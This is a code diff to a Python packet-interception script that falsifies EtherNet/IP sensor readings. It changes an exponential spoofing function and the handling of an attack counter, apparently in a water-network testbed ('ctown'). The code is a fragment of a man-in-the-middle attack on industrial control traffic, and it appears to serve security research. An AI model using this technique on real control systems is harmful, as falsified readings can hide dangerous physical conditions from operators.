@@ -47,11 +47,11 @@ def spoof_value(raw):
 
 def exponential_spoof(raw):
     print ("Spoofing-----------")
-    k = 20
-    t = 10
+    #k = 20
+    t = 50
     float_value = translate_load_to_float(raw)
 
-    fake_value = float_value - k*(1-np.exp(-spoof_attack_counter/t))
+    fake_value = float_value - float_value*(1-np.exp(-spoof_attack_counter/t))
 
     c.execute("UPDATE ctown SET value = 3 WHERE name = 'ATT_1'")
     conn.commit()
@@ -92,15 +92,15 @@ def capture(packet):
                 conn.commit()
                 attack_on = int(rows[0][0])
 
+                global spoof_attack_counter
+                spoof_attack_counter += 1
+
                 if attack_on == 0:
                     print("Attack finished")
                     global spoof_phase
                     spoof_phase = 0
                     __setdown(enip_port)
                     return 0
-
-                global spoof_attack_counter
-                spoof_attack_counter += 1
 
     packet.accept()
 
